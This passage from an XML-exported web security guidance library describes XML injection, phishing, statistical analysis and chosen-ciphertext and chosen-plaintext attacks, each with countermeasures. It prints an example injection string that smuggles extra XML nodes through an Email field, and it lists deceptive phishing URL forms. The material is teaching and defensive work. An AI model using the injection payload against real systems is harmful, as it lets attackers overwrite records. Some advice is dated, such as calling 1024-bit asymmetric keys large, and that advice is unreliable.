&lt;li&gt;Modification of previous node values in the XML &lt;/li&gt;&lt;li&gt;Denial of Service on the server &lt;/li&gt;&lt;li&gt;Exposure of entire XML document to unauthorized users. &lt;/li&gt;&lt;li&gt;Addition of new nodes or even entire documents. &lt;/li&gt;&lt;li&gt;Ability to modify or remove data that should not be accessed.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Vulnerabilities&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Dynamic XML generation using untrusted input &lt;/li&gt;&lt;li&gt;Incorrectly defined schema &lt;/li&gt;&lt;li&gt;Lack of schema validation &lt;/li&gt;&lt;li&gt;Failure to validate input and properly encode any dangerous meta characters according to the context&lt;/li&gt;&lt;/ul&gt;
&lt;a name="x_Countermeasures"&gt;&lt;/a&gt;
&lt;h1&gt;Countermeasures&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;When loading an XML file on the server validate it against a defined XSD&lt;/strong&gt;.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Perform context-sensitive encoding of untrusted input&lt;/strong&gt;. As with encoding data to be output in HTML, a whitelist approach should be taken. For each context which data is going to be inserted in (element, attribute value, etc.) a set of known-safe
 characters should be constructed. The data to be added should be checked against the whitelist, and any characters not specifically listed should be encoded. CDATA sections should be used to further ensure that the parser ignores special characters. Ideally,
 only non-XML values should be accepted from untrusted sources. If an XML blob must be accepted from an untrusted source, it should be manually reassembled from values parsed out and encoded after checking the received blob against an XSD.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Untrusted input should be validated against an inclusion list before use&lt;/strong&gt;. For example, use a RegEx pattern, primitive type casting, a domain constraint, or another validator. See the Additional Resources for more information on data validation.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Trim XML documents to include only the data that is necessary to the application&lt;/strong&gt;.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Use XML processing pipelines to make the flow of data clear and threats easier to identify&lt;/strong&gt;.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Remove DOCTYPE element from user input before creating XML objects&lt;/strong&gt;.&lt;/p&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Example&lt;/h1&gt;
&lt;p&gt;Let us assume that a valid node in our server side XML looks like this:&lt;/p&gt;
&lt;pre&gt;&amp;lt;UserRecord&amp;gt;   &amp;lt;UniqueID&amp;gt;5&amp;lt;/UniqueID&amp;gt;   &amp;lt;Name&amp;gt;Gandalf&amp;lt;/Name&amp;gt;   &amp;lt;Email&amp;gt;Gandalf@MiddleEarth.com&amp;lt;/Email&amp;gt;   &amp;lt;Address&amp;gt;One Middle Earth Way, ME&amp;lt;/Address&amp;gt;   &amp;lt;ZipCode&amp;gt;10000&amp;lt;/ZipCode&amp;gt;   &amp;lt;PhoneNumber&amp;gt;123-456-7890&amp;lt;/PhoneNumber&amp;gt;&amp;lt;/UserRecord&amp;gt;&lt;/pre&gt;
&lt;p&gt;The UniqueID field here is assigned by the server. Now, if web server accepts input from the user and stores it in the XML file, what is the outcome of the parser when a user enters the following data for the Email field:&lt;/p&gt;
&lt;pre&gt;Gandalf@MiddleEarth.com&amp;lt;/Email&amp;gt;&amp;lt;UniqueID&amp;gt;0&amp;lt;/UniqueID&amp;gt;&amp;lt;Name&amp;gt;Gandalf&amp;lt;/Name&amp;gt;&amp;lt;Email&amp;gt;Gandalf@MiddleEarth.com&lt;/pre&gt;
&lt;p&gt;The resulting XML on the server will look like this:&lt;/p&gt;
&lt;pre&gt;&amp;lt;UserRecord&amp;gt;   &amp;lt;UniqueID&amp;gt;5&amp;lt;/UniqueID&amp;gt;   &amp;lt;Name&amp;gt;Gandalf&amp;lt;/Name&amp;gt;   &amp;lt;Email&amp;gt;Gandalf@MiddleEarth.com&amp;lt;/Email&amp;gt;&amp;lt;UniqueID&amp;gt;0&amp;lt;/UniqueID&amp;gt;               &amp;lt;Name&amp;gt;Gandalf&amp;lt;/Name&amp;gt;&amp;lt;Email&amp;gt;Gandalf@MiddleEarth.com&amp;lt;/Email&amp;gt;   &amp;lt;Address&amp;gt;One Middle Earth Way, ME&amp;lt;/Address&amp;gt;   &amp;lt;ZipCode&amp;gt;10000&amp;lt;/ZipCode&amp;gt;   &amp;lt;PhoneNumber&amp;gt;123-456-7890&amp;lt;/PhoneNumber&amp;gt;&amp;lt;/UserRecord&amp;gt;&lt;/pre&gt;
&lt;p&gt;We now have two fields and values for UniqueID, Name and Email. The outcome of parsing such data will depend upon the type of XML parser used:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If a SAX parser is used, it will report the UniqueID for this node to be 0, so an attacker would have essentially overwritten the field value.
&lt;/li&gt;&lt;li&gt;If a DOM parser is used, it will report an error. However, the DOM parser can be abused by inserting additional nodes in the XML while still matching the schema, which will lead to excessive memory consumption by the parser and could potentially result
 in a Denial of Service.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Also note that this is a simple example. It is possible to insert an entire new record among other issues. To fix the example above we can escape the markup delimiters to prevent the users input from being interpreted, replacing &amp;amp; with &amp;amp;amp;, &amp;lt; with &amp;lt;, and
 so on as described in the Countermeasures section. This will prevent the users data from being interpreted in this case. In general, though, we don't know exactly what the input might look like, so the best plan is to have a white-list acceptable characters
 and do type checking as much as possible. Where type checking is not possible consider using CDATA to enforce that the string be treated strictly as data. For example:&lt;/p&gt;
&lt;pre&gt;$evil_input = &amp;quot;Gandalf@MiddleEarth.com&amp;lt;/Email&amp;gt;   &amp;lt;UniqueID&amp;gt;0&amp;lt;/UniqueID&amp;gt;&amp;lt;Name&amp;gt;Gandalf&amp;lt;/Name&amp;gt;&amp;lt;Email&amp;gt;Gandalf@MiddleEarth.com&amp;quot;;$data = &amp;quot;&amp;lt;![CDATA[&amp;quot; &amp;#43; $evil_input &amp;#43; &amp;quot;]]&amp;gt;&amp;quot;;&lt;/pre&gt;
&lt;p&gt;After we insert $data into the email field above the result will be the following acceptable XML:&lt;/p&gt;
&lt;pre&gt;&amp;lt;UserRecord&amp;gt;   &amp;lt;UniqueID&amp;gt;5&amp;lt;/UniqueID&amp;gt;   &amp;lt;Name&amp;gt;Gandalf&amp;lt;/Name&amp;gt;   &amp;lt;Email&amp;gt;&amp;lt;![CDATA[Gandalf@MiddleEarth.com&amp;lt;/Email&amp;gt;&amp;lt;UniqueID&amp;gt;0&amp;lt;/UniqueID&amp;gt;             &amp;lt;Name&amp;gt;Gandalf&amp;lt;/Name&amp;gt;&amp;lt;Email&amp;gt;Gandalf@MiddleEarth.com]]&amp;gt;   &amp;lt;/Email&amp;gt;   &amp;lt;Address&amp;gt;One Middle Earth Way, ME&amp;lt;/Address&amp;gt;   &amp;lt;ZipCode&amp;gt;10000&amp;lt;/ZipCode&amp;gt;   &amp;lt;PhoneNumber&amp;gt;123-456-7890&amp;lt;/PhoneNumber&amp;gt;&amp;lt;/UserRecord&amp;gt;&lt;/pre&gt;
&lt;p&gt;CDATA is very useful when used correctly but it has the same generic problem as we had before. An attacker can create a malicious string that uses &amp;quot;]]&amp;gt;&amp;quot; to end the CDATA and insert malicious XML. Therefore, wherever we use CDATA we must also remove or escape
 ]]&amp;gt; from the input string—at a certain point, it's easier to simply give up and encode everything by whitelist.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.w3.org/XML/Processing/"&gt;http://www.w3.org/XML/Processing/&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="http://www-128.ibm.com/developerworks/xml/library/x-think37/index.html"&gt;http://www-128.ibm.com/developerworks/xml/library/x-think37/index.html&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="http://www.owasp.org/index.php/Data_Validation"&gt;http://www.owasp.org/index.php/Data_Validation&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="http://www-128.ibm.com/developerworks/xml/library/x-tipcfsx.html"&gt;http://www-128.ibm.com/developerworks/xml/library/x-tipcfsx.html&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="http://www.w3schools.com/xml/xml_cdata.asp"&gt;http://www.w3schools.com/xml/xml_cdata.asp&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:1CCC080F-9290-4BD2-8A2C-6A45F59727B0"&gt;Attack: Xpath-XQuery Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764"&gt;Attack: SQL Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9"&gt;Attack: Information Disclosure Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:8515588C-661A-4962-853F-6CD6ABCD8CF6"&gt;Attack: Server-Side Code Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:198CBDAF-3F87-4291-870D-8B6F077D8D36"&gt;Attack: AJAX Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:092BC54D-5A7F-451F-9EB1-AB0A1F1708C0"&gt;Attack: LDAP Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:044B9F0A-6A95-442C-BF24-3F890D0B10EF"&gt;Attack: Client-side Validation Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:42F599F0-D1D6-4F25-9CC2-D5473F19113F"&gt;Guideline: Validate All Data Passed Between Native and Java Code
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:DD60FFDF-904D-45A8-8278-F3E8CEBA911F"&gt;Guideline: Do Not Rely on Request Validation
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:0FFC3880-7F2B-47A5-BC54-F9BD39117BDD"&gt;Guideline: Validate Input from All Sources
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559"&gt;Guideline: Validate Input for Length, Range, Format, and Type
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:D6593992-DC9E-42C5-9E98-30E8EF075B93"&gt;Guideline: Do Not Rely on Client-Side Validation
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>9b3fc217-8a85-4d4d-8e13-3a0963be6703</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Phishing Attack</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Sensitive Data</category>
    <phase>Any</phase>
    <rule_Type>Attack</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies To&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Any web application that requires a user to login to use a service.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;Phishing is an attempt by an attacker to trick a legitimate user into entering personal information into an attacker's website. The attacker typically constructs a website that appears identical to a legitimate website but the data is posted to an illegitimate
 website. &lt;/p&gt;
&lt;p&gt;Most often, the attacker will send a mass e-mail to many users requesting them to update their information on the illegitimate website. The attacker may provide legitimate looking logos which have been harvested off the original website, or even text from
 past legitimate correspondences. The attacker will then provide a link to their malicious website, which has been setup to emulate every aspect of the valid site. The attacker may use a number of techniques to hide the true nature of the URL including URL
 redirection or known e-mail client or browser vulnerabilities. Once the victim browses to the malicious website and submits their information to the site the information is stored by the attacker and the user is redirected to the login site of the legitimate
 site. The malicious webpage may ask the user for any number of bits of sensitive information including: username, password, social security number, phone number, mother's maiden name, address, e-mail address, etc.&lt;/p&gt;
&lt;h1&gt;Impact&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Confidentiality: &lt;/strong&gt;This attack can be used by an attacker to obtain sensitive information about the victim user.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Authentication: &lt;/strong&gt;The sensitive information (username, passwords) obtained using this attack can be used to log in as another user and access more information such as bank account details.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Vulnerabilities&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Web browsers failing to verify a website's security certificate. &lt;/li&gt;&lt;li&gt;Lack of policy against request of such information. &lt;/li&gt;&lt;li&gt;Failure to use modern anti-phishing techniques. &lt;/li&gt;&lt;li&gt;Lack of education for users. &lt;/li&gt;&lt;li&gt;Using multiple domains to host content within the same site, effectively priming users to ignore which domain they're currently talking to.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Countermeasures&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Implement and use SSL: &lt;/strong&gt;Getting a certificate for use in SSL from a trusted Certificate Authority will help the user to verify the server is legitimate.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Create a policy:&lt;/strong&gt; Publicly announce your company will never send a link in an e-mail to update information. Require your users to browse to your website manually.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Use additional security measures: &lt;/strong&gt;New anti-phishing mechanisms require a user to choose a personal image or theme. First, the user submits their username or a cookie (a form of loose identification), then the server responds by showing
 the user the image or theme they have chosen upon account creation, and finally, if the image or theme matches the theme the user remembers selecting, the user logs in completely.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Support only modern browsers: &lt;/strong&gt;Most modern web browsers include basic anti-phishing mechanisms that will help your users verify the legitimacy of the website they are browsing. Encourage your users to upgrade to the latest version of their
 browser software. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Use a single domain for all parts of an application:&lt;/strong&gt; This way, if an attacker attempts to create a fake site to harvest user information, users will be primed to expect all pages to come from the same URL.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Example&lt;/h1&gt;
&lt;p&gt;Attacker's may use variations on the legitimate website address, such as: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Subdomains&lt;/strong&gt;: http://www.abcbank.com.attack.com/ &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Similar domains&lt;/strong&gt;: http://www.abcbank-security.com/ &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Off by one URLs&lt;/strong&gt;: http://www.abcbonk.com/ &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Different languages or encodings&lt;/strong&gt;: http://www.abcbànk.com &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Obscure URL features&lt;/strong&gt;: Some browsers allow the user to provide credentials in the address bar. This is done by preceding the real address with the credentials and the @ (at) symbol, such as: http://www.abcbank.com@attacker.com.
&lt;p&gt;In this example the user would be directed to attacker.com with the credentials of www.abcbank.com which can easily be disregarded by the attacker's website.&lt;/p&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Phishing: &lt;a href="http://en.wikipedia.org/wiki/Phishing"&gt;http://en.wikipedia.org/wiki/Phishing&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;Phishing: &lt;a href="http://www.webopedia.com/DidYouKnow/Internet/2005/phishing.asp"&gt;
http://www.webopedia.com/DidYouKnow/Internet/2005/phishing.asp&lt;/a&gt; &lt;/li&gt;&lt;li&gt;URL redirection: &lt;a href="http://en.wikipedia.org/wiki/URL_redirection"&gt;http://en.wikipedia.org/wiki/URL_redirection&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:5B0B4683-2F43-4F71-8DF4-121013673B4C"&gt;Attack: URL Redirection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:FC9AF70F-092C-4AC6-9B54-6793DE17B8DD"&gt;Attack: Business Rule Attack&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>aabf1365-8bcc-49bb-887b-272bf54520de</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Statistical Analysis Attack</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Sensitive Data</category>
    <phase>Any</phase>
    <rule_Type>Attack</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;br&gt;
&lt;h1 class="x_section"&gt;Applies To&lt;/h1&gt;
&lt;p&gt;Applications encrypting sensitive data.&lt;/p&gt;
&lt;h1 class="x_section"&gt;Description&lt;/h1&gt;
&lt;p&gt;Given large sets of encrypted data an attacker may be able to discover sensitive data by comparing large sets of encrypted packets. An attacker will attempt to gather large amounts of packets to discern some information about a network or software system.
 The attacker may be able to do this by artificially injecting packets into the system to see how they are dealt with by the system or by passively listening to network traffic for interesting packets.
&lt;/p&gt;
&lt;h1 class="x_section"&gt;Impact&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Discovery of encryption keys (WEP Key Attack) &lt;/li&gt;&lt;li&gt;Discovery of packet meta-data such as origin, destination, time stamp, traffic patterns, physical location, network topology, and more
&lt;/li&gt;&lt;li&gt;Unencrypted data – an attack listening to all encrypted e-mail would still recover all unencrypted header information such as to, from, cc, timestamp, subject, etc.&lt;/li&gt;&lt;/ul&gt;
&lt;h1 class="x_section"&gt;Vulnerabilities&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;False sense of security when using encryption libraries&lt;/li&gt;&lt;/ul&gt;
&lt;h1 class="x_section"&gt;Countermeasures&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Always be sure you know what is and what is not being encrypted &lt;/li&gt;&lt;li&gt;Understand what bits of information can be discovered by analyzing packets or information being sent on the network
&lt;/li&gt;&lt;li&gt;Consider using a tool that will help hide some information commonly gathered by statistical analysis attacks&lt;/li&gt;&lt;/ul&gt;
&lt;h1 class="x_section"&gt;Additional Resources&lt;/h1&gt;
&lt;h1 class="x_section"&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:3B657A67-F660-4DB5-9267-6E0FE2DAA1EB"&gt;Attack: Chosen Ciphertext Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:DEBB5734-39D0-4922-BDEE-1E0547E22DAD"&gt;Attack: Chosen Plaintext Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:6D0F24EA-B130-4AAE-9EDF-0B27F04B3145"&gt;Attack: Credentials Brute Force Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:A483E10E-2C4F-4947-863F-81CF93DD5FEA"&gt;Attack: Credentials Dictionary Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:24D078E3-A02F-4EDF-A6EA-DA0E3E5FFE5E"&gt;Attack: Key Bruteforce Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9"&gt;Attack: Information Disclosure Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:C7E4A74A-9557-43E4-8560-AD3193E3B9EE"&gt;Attack: Session Prediction Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:13EE90D9-B0F6-45D6-913A-BA8527525A04"&gt;Attack: Traffic Analysis Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:58543D04-18B3-4F6E-BBEC-1FEDC89F0ED6"&gt;Attack: Weak Password Attack&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>b0bbf434-dc63-49ac-a400-b6dc0c766316</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Chosen Ciphertext Attack</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Cryptography</category>
    <phase>Any</phase>
    <rule_Type>Attack</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;br&gt;
&lt;h1&gt;Applies To&lt;/h1&gt;
&lt;p&gt;Applications that apply cryptographic protection mechanisms.&lt;/p&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;In this attack the goal is to discover the key of a crypto system by controlling what ciphertext is decrypted. The attacker usually has access to a large number of encrypted messages and the equivalent of a tamperproof box that can do decryption. This type
 of attack is primarily applicable to asymmetric encryption algorithms but can also be applied to symmetric encryption algorithms as well. Another variant of this attack is the Adaptive chosen-ciphertext attack in which the attacker sends a number of ciphertexts
 to be decrypted then based on the plaintext that is returned the attacker chooses different ciphertext to be decrypted in the next round.&lt;/p&gt;
&lt;h1&gt;Impact&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Discovery of the private key used in the system.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Vulnerabilities&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Allowing anonymous users to decrypt chosen ciphertext. &lt;/li&gt;&lt;li&gt;Using an encryption algorithm that does not protect against this type of attack.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Countermeasures&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For RSA encryption use Optimal Asymmetric Encryption Padding. &lt;/li&gt;&lt;li&gt;Deny anonymous users the ability to decrypt arbitrary ciphertext.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information on chosen ciphertext attacks, see: &lt;a href="http://en.wikipedia.org/wiki/Chosen_ciphertext_attack"&gt;
http://en.wikipedia.org/wiki/Chosen_ciphertext_attack&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:DEBB5734-39D0-4922-BDEE-1E0547E22DAD"&gt;Attack: Chosen Plaintext Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9"&gt;Attack: Information Disclosure Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:24D078E3-A02F-4EDF-A6EA-DA0E3E5FFE5E"&gt;Attack: Key Bruteforce Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:13EE90D9-B0F6-45D6-913A-BA8527525A04"&gt;Attack: Traffic Analysis Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:5C9F30DE-BD35-4544-87C4-1D2E56D603A0"&gt;Attack: Timing Analysis Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:A2E3F1BD-31BC-41BF-B147-C314A87C2172"&gt;Attack: Statistical Analysis Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:23F61C2C-53E5-4FCD-9AB4-4182DBC19D6D"&gt;Attack: Sniff Memory for Secrets Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:EA8E596E-3498-4DA4-A4C7-55AAAB28B807"&gt;Guideline: Encrypt Sensitive Data in the Database
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:235E588E-621B-4C5E-A50E-8EA447330AD0"&gt;Guideline: Use a Secure Key Storage Location
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:3DC61B01-7418-4CF8-A193-BF968471796A"&gt;Guideline: Store Passwords Securely
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:5E283FD0-1A55-4DC3-971D-BF7C3318E7CB"&gt;Guideline: Encrypt Communication Links
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>bb645071-1c9b-48cc-9622-ac3285e2c6d5</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Chosen Plaintext Attack</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Cryptography</category>
    <phase>Any</phase>
    <rule_Type>Attack</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;br&gt;
&lt;h1&gt;Applies To&lt;/h1&gt;
&lt;p&gt;Applications that use encryption.&lt;/p&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;A chosen plaintext attack (CPA) is a form of &lt;a href="http://en.wikipedia.org/wiki/Cryptanalysis"&gt;
cryptanalysis&lt;/a&gt; where it is assumed that the attacker has access to a device that provides her the capability to choose arbitrary plaintexts to be encrypted and obtain the corresponding ciphertexts.&lt;/p&gt;
&lt;p&gt;An attacker with such capabilities will perform the encryption of selected plaintexts and then analyze the resulting ciphertext in order to gain some further information that reduces the security of the encryption scheme. In the worst case, a chosen plaintext
 attack could reveal the scheme's secret key.&lt;/p&gt;
&lt;h1&gt;Impact&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Disclosure of sensitive data &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Vulnerabilities&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Custom implementation of algorithm. &lt;/li&gt;&lt;li&gt;Use of weak keys (e.g., a short key length). &lt;/li&gt;&lt;li&gt;Exposing cipher text unnecesarily. &lt;/li&gt;&lt;li&gt;Allowing an attacker to submit arbitrary data for encryption.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Countermeasures&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Use well-known implementations of well-known cryptographic algorithms. &lt;/li&gt;&lt;li&gt;Use cryptographically generated random keys. &lt;/li&gt;&lt;li&gt;Use large keys (128-bit symmetric or 1024-bit asymmetric keys). &lt;/li&gt;&lt;li&gt;Utilize platform supplied features to store secret keys. &lt;/li&gt;&lt;li&gt;Follow principle of least privilege to provide limited access to the secret key.
&lt;/li&gt;&lt;li&gt;Maintain key outside of the application domain (e.g., for a Web server, keep the key outside of the webroot).
&lt;/li&gt;&lt;li&gt;If using a symmetric cipher, utilize a unique random IV to hide the underlying character pattern of the plain text and use a chaining mode to prevent the replacement of individual blocks of the cyphertext.
&lt;/li&gt;&lt;li&gt;If using a cryptographic hash algorithm, salt the hash value with a unique random bit stream.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information on this attack, please see &lt;a href="http://en.wikipedia.org/wiki/Chosen_plaintext_attack"&gt;
http://en.wikipedia.org/wiki/Chosen_plaintext_attack&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:3B657A67-F660-4DB5-9267-6E0FE2DAA1EB"&gt;Attack: Chosen Ciphertext Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:24D078E3-A02F-4EDF-A6EA-DA0E3E5FFE5E"&gt;Attack: Key Bruteforce Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:13EE90D9-B0F6-45D6-913A-BA8527525A04"&gt;Attack: Traffic Analysis Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9"&gt;Attack: Information Disclosure Attack&lt;/a&gt;
